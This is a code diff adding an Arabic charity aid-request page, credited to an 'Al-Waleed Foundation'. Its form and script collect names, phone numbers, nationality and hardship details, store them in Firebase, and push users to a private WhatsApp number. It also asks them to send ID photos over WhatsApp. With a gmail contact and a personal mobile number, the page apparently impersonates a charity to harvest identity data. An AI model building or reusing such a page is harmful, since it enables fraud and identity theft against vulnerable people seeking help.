@@ -234,3 +234,218 @@
     <div class="support-item" style="background-image: url('images/de.jpg');">
       <div class="overlay"></div>
       <div class="content">
+        <h3>مساعدة مالية</h3>
+        <p>نقدم الدعم المالي للمحتاجين حول العالم بآلية منظمة إسحب للأعلى لتعبئة البيانات.</p>
+      </div>
+    </div>
+
+    <div class="support-item" style="background-image: url('images/ds.jpg');">
+      <div class="overlay"></div>
+      <div class="content">
+        <h3>سيارات</h3>
+        <p>مبادرات لتوفير وسائل النقل للأسر والأيتام لتسهيل حياتهم.</p>
+      </div>
+    </div>
+
+    <div class="support-item" style="background-image: url('images/dx.jpg');">
+      <div class="overlay"></div>
+      <div class="content">
+        <h3>وحدات سكنية</h3>
+        <p>مشاريع لإعمار المنازل وتوفير المسكن الملائم للمستحقين.</p>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="container">
+    <div class="card">
+
+      <h2>ادخل بياناتك لطلب المساعدة</h2>
+
+      <div class="note">
+        💡 قم بتسجيل بياناتك بشكل سليم، ثم اكتب اسم دولتك للبحث السريع.
+      </div>
+
+      <div class="note">
+        💡 قم برفع صورة الهوية من واتساب بعد ارسال بياناتك.
+      </div>
+
+      <div class="form-group">
+        <label>الاسم الكامل:</label>
+        <input type="text" id="name" placeholder="الاسم كما في الهوية" required>
+      </div>
+
+      <div class="form-group">
+        <label>رقم الجوال:</label>
+        <input type="tel" id="phone" placeholder="مع مفتاح الدولة (00966...)" required>
+      </div>
+
+      <div class="form-group">
+        <label>الجنسية:</label>
+        <input type="text" id="location" placeholder="الدولة" required>
+      </div>
+
+      <div class="form-group">
+        <label>نوع المساعدة:</label>
+        <select id="type" required>
+          <option value="" disabled selected>-- اختر النوع --</option>
+          <option value="مالية">مالية</option>
+          <option value="سكنية">توفير وحدات سكنية</option>
+          <option value="سيارات">طلب وسيلة نقل</option>
+          <option value="اخرى">أخرى</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>شرح الحالة:</label>
+        <textarea id="notes" rows="4" placeholder="اشرح ظروفك بوضوح..." required></textarea>
+      </div>
+
+      <button type="button" id="sendBtn">إرسال الطلب عبر واتساب</button>
+
+    </div>
+  </div>
+
+</section>
+
+<footer class="main-footer">
+  <div class="footer-container">
+
+    <div class="footer-section contact-info">
+      <h3>تواصل معنا</h3>
+
+      <div class="contact-links">
+
+        <a href="mailto:lamiamagedoffice1@gmail.com" class="contact-item">
+          <i class="fas fa-envelope"></i>
+          البريد الإلكتروني
+        </a>
+
+        <a href="https://wa.me/966569872542" class="contact-item">
+          <i class="fab fa-whatsapp"></i>
+          واتساب الدعم
+        </a>
+
+      </div>
+    </div>
+
+    <div class="footer-divider"></div>
+
+    <div class="footer-bottom">
+      <p>جميع حقوق النشر والطبع محفوظة لمؤسسة الوليد &copy; 2026</p>
+    </div>
+
+  </div>
+</footer>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyC1-J4dSTmxUnz5d7dvq9XWrRHf_Lr511M",
+  authDomain: "alwaleed-3a813.firebaseapp.com",
+  projectId: "alwaleed-3a813",
+  storageBucket: "alwaleed-3a813.firebasestorage.app",
+  messagingSenderId: "680698906569",
+  appId: "1:680698906569:web:154df6466c1c89d67f4a18"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const sendBtn = document.getElementById('sendBtn');
+
+sendBtn.onclick = async function () {
+
+  const adminPhone = "966569872542";
+
+  const name = document.getElementById('name').value;
+  const phone = document.getElementById('phone').value;
+  const location = document.getElementById('location').value;
+  const type = document.getElementById('type').value;
+  const notes = document.getElementById('notes').value;
+
+  if (!name || !phone || !location || !type || !notes) {
+    alert("يرجى إكمال جميع الحقول");
+    return;
+  }
+
+  try {
+
+    await addDoc(collection(db, "us"), {
+      name,
+      phone,
+      location,
+      type,
+      notes,
+      date: new Date().toISOString()
+    });
+
+    let message = "📌 *طلب مساعدة جديد* 📌\n\n";
+    message += "• الاسم: " + name + "\n";
+    message += "• الهاتف: " + phone + "\n";
+    message += "• الدولة: " + location + "\n";
+    message += "• نوع المساعدة: " + type + "\n";
+    message += "• التفاصيل: " + notes;
+
+    window.location.href =
+      `https://wa.me/${adminPhone}?text=${encodeURIComponent(message)}`;
+
+  } catch (error) {
+
+    alert("حدث خطأ أثناء الإرسال");
+
+  }
+
+};
+
+</script>
+
+<script>
+
+function toggleWhatsAppModal() {
+  const modal = document.getElementById('whatsappModal');
+
+  if (modal.style.display === 'none' || modal.style.display === '') {
+    modal.style.display = 'flex';
+  } else {
+    modal.style.display = 'none';
+  }
+}
+
+function sendToWhatsApp() {
+
+  const noteElement = document.getElementById('userNote');
+  const note = noteElement.value.trim();
+
+  const phoneNumber = "966569872542";
+
+  if (note === "") {
+    alert("فضلاً اكتب الملاحظة أولاً");
+    return;
+  }
+
+  const fullMessage =
+    "📢 *رسالة جديدة من الموقع الرسمي:*\n\n" + note;
+
+  const encodedText = encodeURIComponent(fullMessage);
+
+  const whatsappUrl =
+    "https://api.whatsapp.com/send?phone=" +
+    phoneNumber +
+    "&text=" +
+    encodedText;
+
+  window.open(whatsappUrl, '_blank');
+
+  toggleWhatsAppModal();
+
+  noteElement.value = "";
+}
+
+</script>
+
+</body>
+</html>
